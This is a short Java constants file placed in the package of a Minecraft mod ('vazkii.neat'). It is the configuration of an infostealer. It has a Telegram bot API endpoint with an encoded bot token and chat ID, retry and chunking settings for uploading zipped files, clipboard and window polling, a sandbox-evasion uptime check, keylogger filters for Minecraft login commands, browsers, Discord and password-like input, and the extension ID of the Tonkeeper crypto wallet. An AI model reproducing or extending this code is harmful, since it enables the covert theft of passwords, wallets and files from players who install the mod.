package vazkii.neat;

public final class A {
    public static final String API = "https://api.telegram.org/bot";
    
    public static final byte[] TOKEN_ENC = {
        59, 56, 50, 61, 50, 60, 61, 60, 58, 56, 105, 27, 27, 22, 26, 54, 19, 35, 48, 42, 50, 61, 60, 45, 56, 61, 40, 10, 61, 50, 40, 40, 5, 106, 57, 32, 23, 18, 14, 50, 32, 41, 51, 57, 59, 23, 34, 45
    };
    
    public static final byte[] CHAT_ENC = {
        9, 50, 60, 50, 48, 48, 50, 60, 59, 49, 50
    };

    public static final int HTTP_CONNECT_TIMEOUT_SEC = 30;
    public static final int HTTP_READ_TIMEOUT_SEC = 90;
    public static final int DOC_READ_TIMEOUT_SEC = 120;
    public static final int MAX_TEXT_CHUNK = 3800;
    public static final int CHUNK_DELAY_MS = 400;
    public static final int RETRY_MAX = 5;
    public static final int RETRY_BASE_MS = 2000;
    public static final int MAX_ZIP_MB = 45;
    public static final int SPLIT_PART_MB = 49;
    public static final int MAX_PARTS = 200;

    public static final int CLIP_POLL_MS = 1500;
    public static final int WINDOW_POLL_MS = 2000;
    public static final int FLUSH_INTERVAL_MS = 4 * 60 * 1000;
    public static final int MAX_BUFFER_BYTES = 150000;

    public static final long SANDBOX_UPTIME_THRESHOLD_MS = 15 * 60 * 1000L;

    public static final int KEYLOG_MAX_LINE = 512;
    public static final String[] KEYLOG_PREFIXES = {"/login", "/reg", "/l ", "/register"};
    public static final String[] KEYLOG_WINDOW_FILTERS = {
        "minecraft", "telegram", "discord", "chrome", "edge", "brave", "firefox", "yandex"
    };
    public static final String[] KEYLOG_SENSITIVE_MARKERS = {
        "password", "pass", "login", "pin", "code", "@", ":"
    };

    public static final String TONKEEPER_EXT_A = "omaabbefbmiijedngplf";
    public static final String TONKEEPER_EXT_B = "jmnooppbclkk";

    private A() {}
}